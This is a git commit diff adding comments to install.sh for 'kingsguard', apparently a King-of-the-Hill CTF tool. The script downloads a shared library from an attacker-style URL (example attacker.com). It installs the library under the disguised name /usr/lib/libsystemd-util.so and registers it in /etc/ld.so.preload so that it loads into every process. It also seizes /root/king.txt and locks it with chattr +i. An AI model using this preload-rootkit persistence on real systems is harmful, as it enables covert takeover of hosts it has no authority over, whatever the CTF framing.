ee864d8e07259549268393cba574f89a623ff37a
Noah Schon <75913553+ns989@users.noreply.github.com>
2022-12-14 20:30:11 -0500

    Added comments
    Added comments to clarify code.

--- install.sh
+++ install.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
+# install.sh - Downloads and installs the kingsguard library
 
-SO_URL="" # The URL of the kingsguard shared library
+SO_URL="" # The URL of the kingsguard shared library. Ex: http://attacker.com/kingsguard.so
 INSTALL_PATH="/usr/lib/libsystemd-util.so" # The full path on the target to install the shared library
 USERNAME="" # The username to write to king flag
 KING_FILE="/root/king.txt" # The path to the king.txt file
@@ -25,12 +26,15 @@ fi
 # Set library permissions
 chmod 755 "${INSTALL_PATH}"
 
+# Write your username to king.txt
 echo "[*] Changing the contents of king.txt to ${USERNAME}..."
 echo "${USERNAME}" > "${KING_FILE}"
 
+# This makes the file unwritable unless you remove the "immutable" attribute.
 echo "[*] Making king.txt immutable..."
 chattr +i "${KING_FILE}"
 
+# Adds library to the system's LD_PRELOAD
 echo "[*] Installing library..."
 echo "${INSTALL_PATH}" > /etc/ld.so.preload
 
